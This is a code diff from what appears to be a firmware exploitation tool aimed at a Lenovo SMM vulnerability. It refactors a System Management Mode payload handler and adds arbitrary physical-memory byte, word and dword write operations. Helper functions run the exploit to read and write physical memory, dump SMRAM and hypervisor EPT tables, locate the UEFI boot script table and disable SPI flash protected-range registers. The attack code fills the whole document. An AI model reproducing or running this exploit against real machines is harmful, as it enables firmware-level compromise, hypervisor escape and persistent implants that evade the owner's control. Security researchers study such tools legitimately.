@@ -27,18 +27,21 @@
 
 // commands to smm_handler()
 #define SMM_OP_NONE             0   // do nothing, just check for successful exploitation
-#define SMM_OP_PHYS_MEM_READ    1   // read physical memory from SMM
-#define SMM_OP_PHYS_MEM_WRITE   2   // write physical memory from SMM
-#define SMM_OP_PHYS_PAGE_READ   3   // read physical memory from SMM using page table remap
-#define SMM_OP_PHYS_PAGE_WRITE  4   // write physical memory from SMM using page table remap
-#define SMM_OP_EXECUTE          5   // execute SMM code at specified physical address
-#define SMM_OP_GET_SMRAM_ADDR   6   // return SMRAM region address
-#define SMM_OP_GET_SMST_ADDR    7   // return EFI_SMM_SYSTEM_TABLE2 address
-#define SMM_OP_GET_MEM_INFO     8   // return physical memory information
-#define SMM_OP_READ_BYTE        9
-#define SMM_OP_READ_WORD        10
-#define SMM_OP_READ_DWORD       11
-#define SMM_OP_TEST             12
+#define SMM_OP_MEM_READ         1   // read physical memory from SMM
+#define SMM_OP_MEM_WRITE        2   // write physical memory from SMM
+#define SMM_OP_MEM_PAGE_READ    3   // read physical memory from SMM using page table remap
+#define SMM_OP_MEM_PAGE_WRITE   4   // write physical memory from SMM using page table remap
+#define SMM_OP_MEM_READ_BYTE    5   // read byte from physical memory
+#define SMM_OP_MEM_READ_WORD    6   // read word from physical memory
+#define SMM_OP_MEM_READ_DWORD   7   // read dword from physical memory
+#define SMM_OP_MEM_WRITE_BYTE   8   // write byte to physical memory
+#define SMM_OP_MEM_WRITE_WORD   9   // write word to physical memory
+#define SMM_OP_MEM_WRITE_DWORD  10  // write dword to physical memory
+#define SMM_OP_EXECUTE          11  // execute SMM code at specified physical address
+#define SMM_OP_GET_SMRAM_ADDR   12  // return SMRAM region address
+#define SMM_OP_GET_SMST_ADDR    13  // return EFI_SMM_SYSTEM_TABLE2 address
+#define SMM_OP_GET_MEM_INFO     14  // return physical memory information
+#define SMM_OP_TEST             15
 
 // default size for TSEG/HSEG
 #define SMRAM_SIZE 0x800000
@@ -102,13 +105,34 @@ typedef struct _SMM_HANDLER_CONTEXT
 
     union
     {
-        struct // for SMM_OP_PHYS_MEM_READ, SMM_OP_PHYS_MEM_WRITE, etc.
+        struct // for SMM_OP_MEM_READ, SMM_OP_MEM_WRITE, etc.
         {
             void *addr;
             unsigned int size;
             unsigned char data[];
 
-        } phys_mem;
+        } mem;
+
+        struct // for SMM_OP_MEM_READ_BYTE and SMM_OP_MEM_WRITE_BYTE
+        {
+            void *addr;
+            unsigned char val;
+
+        } byte;
+
+        struct // for SMM_OP_MEM_READ_WORD and SMM_OP_MEM_WRITE_WORD
+        {
+            void *addr;
+            unsigned short val;
+
+        } word;
+
+        struct // for SMM_OP_MEM_READ_DWORD and SMM_OP_MEM_WRITE_DWORD
+        {
+            void *addr;
+            unsigned int val;
+
+        } dword;
 
         struct // for SMM_OP_EXECUTE
         {
@@ -126,28 +150,7 @@ typedef struct _SMM_HANDLER_CONTEXT
         {
             unsigned long long addr;
 
-        } smst_addr;
-
-        struct // for SMM_OP_READ_BYTE
-        {
-            void *addr;
-            unsigned char val;
-
-        } byte;
-
-        struct // for SMM_OP_READ_WORD
-        {
-            void *addr;
-            unsigned short val;
-
-        } word;
-
-        struct // for SMM_OP_READ_DWORD
-        {
-            void *addr;
-            unsigned int val;
-
-        } dword;
+        } smst_addr;        
 
         struct // for SMM_OP_TEST
         {
@@ -195,40 +198,32 @@ static unsigned long m_current_cpu = 0;
 static void smm_handler(void *context)
 {
     int status = -1;
-    PSMM_HANDLER_CONTEXT handler_context = (PSMM_HANDLER_CONTEXT)context;
+    PSMM_HANDLER_CONTEXT ctx = (PSMM_HANDLER_CONTEXT)context;
 
-    if (handler_context->op == SMM_OP_NONE)
+    if (ctx->op == SMM_OP_NONE)
     {
         // do nothing
         status = 0;
     }
-    else if (handler_context->op == SMM_OP_PHYS_MEM_READ)
+    else if (ctx->op == SMM_OP_MEM_READ)
     {
         // read physical memory
-        memcpy(
-            &handler_context->phys_mem.data,
-            handler_context->phys_mem.addr,
-            handler_context->phys_mem.size
-        );
+        memcpy(&ctx->mem.data, ctx->mem.addr, ctx->mem.size);
 
         status = 0;
     }
-    else if (handler_context->op == SMM_OP_PHYS_MEM_WRITE)
+    else if (ctx->op == SMM_OP_MEM_WRITE)
     {
         // write physical memory
-        memcpy(
-            handler_context->phys_mem.addr,
-            &handler_context->phys_mem.data,
-            handler_context->phys_mem.size
-        );
+        memcpy(ctx->mem.addr, &ctx->mem.data, ctx->mem.size);
 
         status = 0;
     }    
-    else if (handler_context->op == SMM_OP_PHYS_PAGE_READ ||
-             handler_context->op == SMM_OP_PHYS_PAGE_WRITE)
+    else if (ctx->op == SMM_OP_MEM_PAGE_READ ||
+             ctx->op == SMM_OP_MEM_PAGE_WRITE)
     {
         unsigned long long cr3 = _cr3_get(), addr = 0;
-        unsigned long long mem_addr = (unsigned long long)handler_context->phys_mem.addr;
+        unsigned long long mem_addr = (unsigned long long)ctx->mem.addr;
 
         X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry =
             (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)(PML4_ADDRESS(cr3) + 
@@ -265,26 +260,17 @@ static void smm_handler(void *context)
                             _invlpg(addr);
 
                             // we can do memory reads or writes only within one 2 Mb virtual page
-                            handler_context->phys_mem.size = 
-                                min(handler_context->phys_mem.size, PAGE_SIZE_2MB - offset);                            
+                            ctx->mem.size = min(ctx->mem.size, PAGE_SIZE_2MB - offset);                            
 
-                            if (handler_context->op == SMM_OP_PHYS_PAGE_READ)
+                            if (ctx->op == SMM_OP_MEM_PAGE_READ)
                             {
                                 // read physical memory page
-                                memcpy(
-                                    &handler_context->phys_mem.data, 
-                                    (unsigned char *)addr + offset,
-                                    handler_context->phys_mem.size
-                                );
+                                memcpy(&ctx->mem.data, (unsigned char *)addr + offset, ctx->mem.size);
                             }
                             else
                             {
                                 // write physical memory page
-                                memcpy(
-                                    (unsigned char *)addr + offset,
-                                    &handler_context->phys_mem.data,
-                                    handler_context->phys_mem.size
-                                );
+                                memcpy((unsigned char *)addr + offset, &ctx->mem.data, ctx->mem.size);
                             }
                             
                             // restore old PFN
@@ -320,25 +306,67 @@ static void smm_handler(void *context)
             status = 1;
         }
     }
-    else if (handler_context->op == SMM_OP_EXECUTE)
+    else if (ctx->op == SMM_OP_MEM_READ_BYTE)
+    {
+        // read byte from physical memory
+        ctx->byte.val = *(unsigned char *)ctx->byte.addr;
+
+        status = 0;
+    }
+    else if (ctx->op == SMM_OP_MEM_READ_WORD)
+    {
+        // read word from physical memory
+        ctx->word.val = *(unsigned short *)ctx->word.addr;
+
+        status = 0;
+    }
+    else if (ctx->op == SMM_OP_MEM_READ_DWORD)
+    {
+        // read dword from physical memory
+        ctx->dword.val = *(unsigned int *)ctx->dword.addr;
+
+        status = 0;
+    }
+    else if (ctx->op == SMM_OP_MEM_WRITE_BYTE)
+    {
+        // write byte to physical memory
+        *(unsigned char *)ctx->byte.addr = ctx->byte.val;
+
+        status = 0;
+    }
+    else if (ctx->op == SMM_OP_MEM_WRITE_WORD)
+    {
+        // write word to physical memory
+        *(unsigned short *)ctx->word.addr = ctx->word.val;
+
+        status = 0;
+    }
+    else if (ctx->op == SMM_OP_MEM_WRITE_DWORD)
+    {
+        // write dword to physical memory
+        *(unsigned int *)ctx->dword.addr = ctx->dword.val;
+
+        status = 0;
+    }
+    else if (ctx->op == SMM_OP_EXECUTE)
     {
         // run specified code
-        if (handler_context->execute.addr)
+        if (ctx->execute.addr)
         {
-            handler_context->execute.addr();
+            ctx->execute.addr();
         }
 
         status = 0;
     }
-    else if (handler_context->op == SMM_OP_GET_SMRAM_ADDR)
+    else if (ctx->op == SMM_OP_GET_SMRAM_ADDR)
     {
         // calculate SMRAM address by stack pointer value
-        handler_context->smram_addr.addr = (unsigned long long)&status;
-        handler_context->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);
+        ctx->smram_addr.addr = (unsigned long long)&status;
+        ctx->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);
 
         status = 0;
     }
-    else if (handler_context->op == SMM_OP_GET_SMST_ADDR)
+    else if (ctx->op == SMM_OP_GET_SMST_ADDR)
     {
         // calculate SMRAM address by stack pointer value
         unsigned long long smram_addr = (unsigned long long)&status;
@@ -350,40 +378,19 @@ static void smm_handler(void *context)
             if (*(unsigned int *)(smram_addr + i) == 'TSMS' &&
                 *(unsigned int *)(smram_addr + i + sizeof(int)) == 0)
             {
-                handler_context->smst_addr.addr = smram_addr + i;
+                ctx->smst_addr.addr = smram_addr + i;
                 status = 0;
 
                 break;
             }
         }        
-    }
-    else if (handler_context->op == SMM_OP_READ_BYTE)
-    {
-        // read byte from physical memory
-        handler_context->byte.val = *(unsigned char *)handler_context->byte.addr;
-        
-        status = 0;
-    }
-    else if (handler_context->op == SMM_OP_READ_WORD)
-    {
-        // read word from physical memory
-        handler_context->word.val = *(unsigned short *)handler_context->word.addr;
-        
-        status = 0;
-    }
-    else if (handler_context->op == SMM_OP_READ_DWORD)
-    {
-        // read dword from physical memory
-        handler_context->dword.val = *(unsigned int *)handler_context->dword.addr;
-        
-        status = 0;
-    }
-    else if (handler_context->op == SMM_OP_TEST)
+    }    
+    else if (ctx->op == SMM_OP_TEST)
     {
         // ...
     }
 
-    handler_context->status = status;    
+    ctx->status = status;    
 }
 
 #pragma code_seg()
@@ -579,7 +586,7 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT context, unsigned int context_size, bool quiet)
+int exploit(PUEFI_EXPL_TARGET target, PSMM_HANDLER_CONTEXT context, unsigned int context_size, bool quiet)
 {
     int ret = -1;
     unsigned long long addr = 0, phys_addr = 0;
@@ -608,7 +615,7 @@ int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT co
         if (uefi_expl_phys_mem_write(phys_addr, context_size, (unsigned char *)context))
         {
             // run exploit
-            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, custom_target, smm_handler, (void *)phys_addr, quiet))
+            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, smm_handler, (void *)phys_addr, quiet))
             {
                 // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
                 if (uefi_expl_phys_mem_read(phys_addr, context_size, (unsigned char *)context))
@@ -654,7 +661,7 @@ int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT co
 }
 //--------------------------------------------------------------------------------------
 int phys_mem_read(
-    int target, PUEFI_EXPL_TARGET custom_target, 
+    PUEFI_EXPL_TARGET target, 
     void *addr, unsigned long long size, unsigned char *data, 
     const char *file_path)
 {
@@ -682,34 +689,34 @@ int phys_mem_read(
     }
 
     memset(context, 0, context_size);
-    context->op = SMM_OP_PHYS_PAGE_READ;
+    context->op = SMM_OP_MEM_PAGE_READ;
 
     while (p < size)
     {
         unsigned int data_size = min(chunk_size, size - p);
     
-        context->phys_mem.addr = (unsigned char *)addr + p;
-        context->phys_mem.size = data_size;
+        context->mem.addr = (unsigned char *)addr + p;
+        context->mem.size = data_size;
 
         // read single chunk of memory
-        if (exploit(target, custom_target, context, context_size, true) != 0)
+        if (exploit(target, context, context_size, true) != 0)
         {
             printf("ERROR: exploit() fails\n");
             goto _end;
         }
 
-        data_size = context->phys_mem.size;
+        data_size = context->mem.size;
 
         if (data)
         {
             // copy readed data to buffer
-            memcpy(data + p, context->phys_mem.data, data_size);
+            memcpy(data + p, context->mem.data, data_size);
         }
 
         if (f)
         {
             // write readed data to file
-            if (fwrite(context->phys_mem.data, 1, data_size, f) != data_size)
+            if (fwrite(context->mem.data, 1, data_size, f) != data_size)
             {
                 printf("ERROR: fwrite() fails\n");
                 goto _end;
@@ -719,7 +726,7 @@ int phys_mem_read(
         if (data == NULL && f == NULL)
         {
             // print memory dump to the console
-            hexdump(context->phys_mem.data, data_size, (unsigned long long)addr + p);
+            hexdump(context->mem.data, data_size, (unsigned long long)addr + p);
         }
 
         p += data_size;
@@ -745,8 +752,60 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
+int phys_mem_read_val(PUEFI_EXPL_TARGET target, void *addr, data_width size, void *val)
+{
+    SMM_HANDLER_CONTEXT context;
+    memset(&context, 0, sizeof(context));
+
+    if (size == U8)
+    {
+        context.op = SMM_OP_MEM_READ_BYTE;
+        context.byte.addr = addr;
+    }
+    else if (size == U16)
+    {
+        context.op = SMM_OP_MEM_READ_WORD;
+        context.word.addr = addr;
+    }
+    else if (size == U32)
+    {
+        context.op = SMM_OP_MEM_READ_DWORD;
+        context.dword.addr = addr;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: Invalid data size\n");
+        return -1;
+    }
+
+    // run exploitation to read a value from physical memory
+    if (exploit(target, &context, NULL, true) == 0)
+    {
+        if (size == U8)
+        {
+            *(unsigned char *)val = context.byte.val;
+        }
+        else if (size == U16)
+        {
+            *(unsigned short *)val = context.word.val;
+        }
+        else if (size == U32)
+        {
+            *(unsigned int *)val = context.dword.val;
+        }
+
+        return 0;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: exploit() fails\n");
+    }
+
+    return -1;
+}
+//--------------------------------------------------------------------------------------
 int phys_mem_write(
-    int target, PUEFI_EXPL_TARGET custom_target, 
+    PUEFI_EXPL_TARGET target, 
     void *addr, unsigned long long size, unsigned char *data, 
     const char *file_path)
 {
@@ -805,14 +864,14 @@ int phys_mem_write(
     }
 
     memset(context, 0, context_size);
-    context->op = SMM_OP_PHYS_PAGE_WRITE;
+    context->op = SMM_OP_MEM_PAGE_WRITE;
 
     while (p < size)
     {
         unsigned int data_size = min(chunk_size, size - p);
 
-        context->phys_mem.addr = (unsigned char *)addr + p;
-        context->phys_mem.size = data_size;
+        context->mem.addr = (unsigned char *)addr + p;
+        context->mem.size = data_size;
 
         if (file_path)
         {
@@ -823,7 +882,7 @@ int phys_mem_write(
             }
 
             // read data from file
-            if (fread(context->phys_mem.data, 1, data_size, f) != data_size)
+            if (fread(context->mem.data, 1, data_size, f) != data_size)
             {
                 printf("ERROR: fread() fails\n");
                 goto _end;
@@ -832,17 +891,17 @@ int phys_mem_write(
         else if (data)
         {
             // copy data from buffer
-            memcpy(context->phys_mem.data, data + p, data_size);
+            memcpy(context->mem.data, data + p, data_size);
         }
 
         // write single chunk of memory
-        if (exploit(target, custom_target, context, context_size, true) != 0)
+        if (exploit(target, context, context_size, true) != 0)
         {
             printf("ERROR: exploit() fails\n");
             goto _end;
         }
 
-        data_size = context->phys_mem.size;
+        data_size = context->mem.size;
 
         p += data_size;
         total += data_size;
@@ -867,27 +926,28 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-int phys_mem_read_val(
-    int target, PUEFI_EXPL_TARGET custom_target,
-    void *addr, data_width size, void *val)
+int phys_mem_write_val(PUEFI_EXPL_TARGET target, void *addr, data_width size, void *val)
 {
     SMM_HANDLER_CONTEXT context;
     memset(&context, 0, sizeof(context));
 
     if (size == U8)
     {
-        context.op = SMM_OP_READ_BYTE;
+        context.op = SMM_OP_MEM_WRITE_BYTE;
         context.byte.addr = addr;
+        context.byte.val = *(unsigned char *)val;
     }
     else if (size == U16)
     {
-        context.op = SMM_OP_READ_WORD;
+        context.op = SMM_OP_MEM_WRITE_WORD;
         context.word.addr = addr;
+        context.word.val = *(unsigned short *)val;
     }
     else if (size == U32)
     {
-        context.op = SMM_OP_READ_DWORD;
+        context.op = SMM_OP_MEM_WRITE_DWORD;
         context.dword.addr = addr;
+        context.dword.val = *(unsigned int *)val;
     }
     else
     {
@@ -895,22 +955,9 @@ int phys_mem_read_val(
         return -1;
     }
 
-    // run exploitation to read a value from physical memory
-    if (exploit(target, custom_target, &context, NULL, true) == 0)
-    {
-        if (size == U8)
-        {
-            *(unsigned char *)val = context.byte.val;
-        }
-        else if (size == U16)
-        {
-            *(unsigned short *)val = context.word.val;
-        }
-        else if (size == U32)
-        {
-            *(unsigned int *)val = context.dword.val;
-        }        
-
+    // run exploitation to write a value from physical memory
+    if (exploit(target, &context, NULL, true) == 0)
+    {                
         return 0;
     }
     else
@@ -921,7 +968,7 @@ int phys_mem_read_val(
     return -1;
 }
 //--------------------------------------------------------------------------------------
-unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
+unsigned long long smram_addr(PUEFI_EXPL_TARGET target)
 {
 
 #ifdef USE_SMRR
@@ -959,7 +1006,7 @@ unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
     context.op = SMM_OP_GET_SMRAM_ADDR;
 
     // run exploitation to get SMRAM address
-    if (exploit(target, custom_target, &context, NULL, false) == 0)
+    if (exploit(target, &context, NULL, false) == 0)
     {
         return context.smram_addr.addr;
     }
@@ -973,14 +1020,14 @@ unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
     return 0;
 }
 //--------------------------------------------------------------------------------------
-unsigned long long smst_addr(int target, PUEFI_EXPL_TARGET custom_target)
+unsigned long long smst_addr(PUEFI_EXPL_TARGET target)
 {
     SMM_HANDLER_CONTEXT context;
     memset(&context, 0, sizeof(context));
     context.op = SMM_OP_GET_SMST_ADDR;
 
     // run exploitation to get EFI_SMM_SYSTEM_TABLE2 address
-    if (exploit(target, custom_target, &context, NULL, true) == 0)
+    if (exploit(target, &context, NULL, true) == 0)
     {
         return context.smst_addr.addr;
     }
@@ -993,14 +1040,14 @@ unsigned long long smst_addr(int target, PUEFI_EXPL_TARGET custom_target)
 }
 //--------------------------------------------------------------------------------------
 bool eptp_info(
-    int target, PUEFI_EXPL_TARGET custom_target, 
+    PUEFI_EXPL_TARGET target, 
     unsigned int cpu_num, unsigned long long addr,
     unsigned int *ept_enable, unsigned long long *eptp, unsigned long long *cr3)
 {    
     #define SAVED_STATE_READ(_offs_, _val_, _len_)                          \
                                                                             \
         phys_mem_read(                                                      \
-            target, custom_target,                                          \
+            target,                                                         \
             (void *)(addr + (_offs_)), (_len_), (unsigned char *)(_val_),   \
             NULL)    
 
@@ -1042,11 +1089,11 @@ bool eptp_info(
 #define EPT_FIND_WAIT 1
 
 bool ept_find(
-    int target, PUEFI_EXPL_TARGET custom_target,
+    PUEFI_EXPL_TARGET target,
     int *items_found, unsigned long long **ept, unsigned long long *vmm_cr3)
 {
     // determinate SMRAM address
-    unsigned long long addr = smram_addr(target, custom_target);
+    unsigned long long addr = smram_addr(target);
     if (addr == 0)
     {
         printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
@@ -1091,7 +1138,7 @@ bool ept_find(
             unsigned long long eptp = 0, cr3 = 0;
 
             // get EPT information for each logical CPU
-            if (!eptp_info(target, custom_target, cpu_num, addr, &ept_enable, &eptp, &cr3))
+            if (!eptp_info(target, cpu_num, addr, &ept_enable, &eptp, &cr3))
             {
                 printf(__FUNCTION__"() ERROR: eptp_info() fails\n");
                 return false;
@@ -1154,7 +1201,7 @@ bool ept_find(
 
 #define EPT_PRESENT(_val_) (((_val_) & 7) != 0)
 
-int ept_dump(int target, PUEFI_EXPL_TARGET custom_target, unsigned long long pml4_addr, const char *file_path)
+int ept_dump(PUEFI_EXPL_TARGET target, unsigned long long pml4_addr, const char *file_path)
 {
     FILE *fd = NULL;
     X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_page = NULL, *PDPT_page = NULL;
@@ -1192,7 +1239,7 @@ int ept_dump(int target, PUEFI_EXPL_TARGET custom_target, unsigned long long pml
 
     // read PML4 memory page
     if (phys_mem_read(
-        target, custom_target, (void *)PML4_ADDRESS(pml4_addr), 
+        target, (void *)PML4_ADDRESS(pml4_addr), 
         PAGE_SIZE, (unsigned char *)PML4_page, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1213,7 +1260,7 @@ int ept_dump(int target, PUEFI_EXPL_TARGET custom_target, unsigned long long pml
         
         // read PDPT memory page
         if (phys_mem_read(
-            target, custom_target, (void *)PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
+            target, (void *)PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress), 
             PAGE_SIZE, (unsigned char *)PDPT_page, NULL) != 0)
         {
             printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1238,7 +1285,7 @@ int ept_dump(int target, PUEFI_EXPL_TARGET custom_target, unsigned long long pml
 
                 // read PDE memory page
                 if (phys_mem_read(
-                    target, custom_target, (void *)PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress),
+                    target, (void *)PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress),
                     PAGE_SIZE, (unsigned char *)PD_page, NULL) != 0)
                 {
                     printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1260,7 +1307,7 @@ int ept_dump(int target, PUEFI_EXPL_TARGET custom_target, unsigned long long pml
 
                         // read PTE memory page
                         if (phys_mem_read(
-                            target, custom_target, (void *)PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress),
+                            target, (void *)PFN_TO_PAGE(PD_entry->Bits.PageTableBaseAddress),
                             PAGE_SIZE, (unsigned char *)PT_page, NULL) != 0)
                         {
                             printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1375,7 +1422,7 @@ _end:
     return false;
 }
 //--------------------------------------------------------------------------------------
-int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_path)
+int phys_mem_dump(PUEFI_EXPL_TARGET target, const char *file_path)
 {
     int ret = -1;
     unsigned long long TOUUD = 0, TOLUD = 0;
@@ -1399,7 +1446,7 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
     TOLUD &= ~1;
     TOUUD &= ~1;
 
-    unsigned long long TSEG = smram_addr(target, custom_target);
+    unsigned long long TSEG = smram_addr(target);
     if (TSEG == 0)
     {
         printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
@@ -1448,7 +1495,7 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
         printf("Reading 0x%llx:0x%llx...\n", addr, addr + buff_size - 1);
 
         // read snigle chunk of memory
-        if (phys_mem_read(target, custom_target, (void *)addr, buff_size, buff, NULL) != 0)
+        if (phys_mem_read(target, (void *)addr, buff_size, buff, NULL) != 0)
         {
             printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
             goto _end;
@@ -1485,7 +1532,7 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
         printf("Reading 0x%llx:0x%llx...\n", addr, addr + buff_size - 1);
 
         // read snigle chunk of memory
-        if (phys_mem_read(target, custom_target, (void *)addr, buff_size, buff, NULL) != 0)
+        if (phys_mem_read(target, (void *)addr, buff_size, buff, NULL) != 0)
         {
             printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
             goto _end;
@@ -1529,12 +1576,12 @@ typedef struct
 
 } EFI_CONFIGURATION_TABLE;
 
-unsigned long long configuration_table_addr(int target, PUEFI_EXPL_TARGET custom_target, GUID *guid)
+unsigned long long configuration_table_addr(PUEFI_EXPL_TARGET target, GUID *guid)
 {
     unsigned long long ret = 0, table_addr = 0, table_entries = 0;
 
     // get EFI_SMM_SYSTEM_TABLE2 address
-    unsigned long long smst = smst_addr(target, custom_target);
+    unsigned long long smst = smst_addr(target);
     if (smst == 0)
     {
         printf(__FUNCTION__"() ERROR: smst_addr() fails\n");
@@ -1547,7 +1594,7 @@ unsigned long long configuration_table_addr(int target, PUEFI_EXPL_TARGET custom
 
     // read NumberOfTableEntries value
     if (phys_mem_read(
-        target, custom_target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_NumberOfTableEntries), 
+        target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_NumberOfTableEntries), 
         sizeof(unsigned long long), (unsigned char *)&table_entries, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1562,7 +1609,7 @@ unsigned long long configuration_table_addr(int target, PUEFI_EXPL_TARGET custom
 
     // read SmmConfigurationTable pointer
     if (phys_mem_read(
-        target, custom_target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_SmmConfigurationTable),
+        target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_SmmConfigurationTable),
         sizeof(unsigned long long), (unsigned char *)&table_addr, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1586,7 +1633,7 @@ unsigned long long configuration_table_addr(int target, PUEFI_EXPL_TARGET custom
 
         // read configuration table entry
         if (phys_mem_read(
-            target, custom_target, (void *)(table_addr + i * sizeof(EFI_CONFIGURATION_TABLE)),
+            target, (void *)(table_addr + i * sizeof(EFI_CONFIGURATION_TABLE)),
             sizeof(EFI_CONFIGURATION_TABLE), (unsigned char *)&table_entry, NULL) != 0)
         {
             printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1629,12 +1676,10 @@ typedef struct
 
 } SMM_BOOT_SCRIPT;
 
-int boot_script_table_addr(
-    int target, PUEFI_EXPL_TARGET custom_target, 
-    unsigned long long *addr, unsigned int *size)
+int boot_script_table_addr(PUEFI_EXPL_TARGET target, unsigned long long *addr, unsigned int *size)
 {
     // get SMRAM address
-    unsigned long long TSEG = smram_addr(target, custom_target);
+    unsigned long long TSEG = smram_addr(target);
     if (TSEG == 0)
     {
         printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
@@ -1644,10 +1689,7 @@ int boot_script_table_addr(
     printf("SMRAM is at 0x%llx:0x%llx\n", TSEG, TSEG + SMRAM_SIZE - 1);
 
     // find EFI SMM configuration table that belongs to SMM lockbox
-    unsigned long long lockbox_addr = configuration_table_addr(
-        target, custom_target, 
-        gEfiSmmLockBoxCommunicationGuid
-    );
+    unsigned long long lockbox_addr = configuration_table_addr(target, gEfiSmmLockBoxCommunicationGuid);
     if (lockbox_addr == 0)
     {
         printf(__FUNCTION__"() ERROR: Unable to find SMM lockbox configuration entry\n");
@@ -1660,7 +1702,7 @@ int boot_script_table_addr(
 
     // read SMM lockbox structure
     if (phys_mem_read(
-        target, custom_target, (void *)lockbox_addr,
+        target, (void *)lockbox_addr,
         sizeof(SMM_LOCK_BOX_DATA), (unsigned char *)&lockbox, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1684,7 +1726,7 @@ int boot_script_table_addr(
 
     // read SMM lockbox LIST_ENTRY
     if (phys_mem_read(
-        target, custom_target, (void *)lockbox.Head,
+        target, (void *)lockbox.Head,
         sizeof(LIST_ENTRY), (unsigned char *)&list_entry, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1701,7 +1743,7 @@ int boot_script_table_addr(
 
     // read boot script table information
     if (phys_mem_read(
-        target, custom_target, 
+        target, 
         (void *)((unsigned long long)list_entry.Blink - FIELD_OFFSET(SMM_BOOT_SCRIPT, Link)),
         sizeof(SMM_BOOT_SCRIPT), (unsigned char *)&bootscript, NULL) != 0)
     {
@@ -1730,7 +1772,7 @@ int boot_script_table_addr(
 
     // read boot script table signature
     if (phys_mem_read(
-        target, custom_target, bootscript.Address,
+        target, bootscript.Address,
         sizeof(unsigned short), (unsigned char *)&bootscript_magic, NULL) != 0)
     {
         printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
@@ -1750,7 +1792,7 @@ int boot_script_table_addr(
 }
 //--------------------------------------------------------------------------------------
 int pr_get(
-    int target, PUEFI_EXPL_TARGET custom_target,
+    PUEFI_EXPL_TARGET target,
     unsigned int *pr0_val, unsigned int *pr1_val, 
     unsigned int *pr2_val, unsigned int *pr3_val, 
     unsigned int *pr4_val)
@@ -1789,8 +1831,7 @@ int pr_get(
         *pr_regs[i].val = 0;
 
         // read single PRx register
-        if (phys_mem_read_val(
-            target, custom_target, (void *)pr_regs[i].addr, U32, pr_regs[i].val) != 0)
+        if (phys_mem_read_val(target, (void *)pr_regs[i].addr, U32, pr_regs[i].val) != 0)
         {
             printf(__FUNCTION__"() ERROR: phys_mem_read_val() fails\n");
             return -1;
@@ -1800,7 +1841,7 @@ int pr_get(
     return 0;
 }
 //--------------------------------------------------------------------------------------
-int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
+int pr_disable(int target_, PUEFI_EXPL_TARGET target)
 {
     int ret = -1;
     unsigned long long bootscript_addr = 0, RCBA = 0;
@@ -1808,7 +1849,7 @@ int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
     unsigned int pr0_val = 0, pr1_val = 0, pr2_val = 0, pr3_val = 0, pr4_val = 0;
 
     // get current values of PRx registers
-    if (pr_get(target, custom_target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
+    if (pr_get(target, &pr0_val, &pr1_val, &pr2_val, &pr3_val, &pr4_val) != 0)
     {
         printf(__FUNCTION__"() ERROR: pr_get() fails\n");
         return -1;
@@ -1846,7 +1887,7 @@ int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
     printf("Root Complex Register Block is at 0x%llx\n", rcrb_addr);
 
     // find UEFI boot script table address (points inside SMRAM) and size
-    if (boot_script_table_addr(target, custom_target, &bootscript_addr, &bootscript_size) != 0)
+    if (boot_script_table_addr(target, &bootscript_addr, &bootscript_size) != 0)
     {
         printf(__FUNCTION__"() ERROR: Unable to find UEFI boot script table\n");
         return -1;
@@ -1861,7 +1902,7 @@ int pr_disable(int target, PUEFI_EXPL_TARGET custom_target)
 
     // read boot script table entries
     if (phys_mem_read(
-        target, custom_target, (void *)bootscript_addr, bootscript_size, bootscript, NULL) != 0)
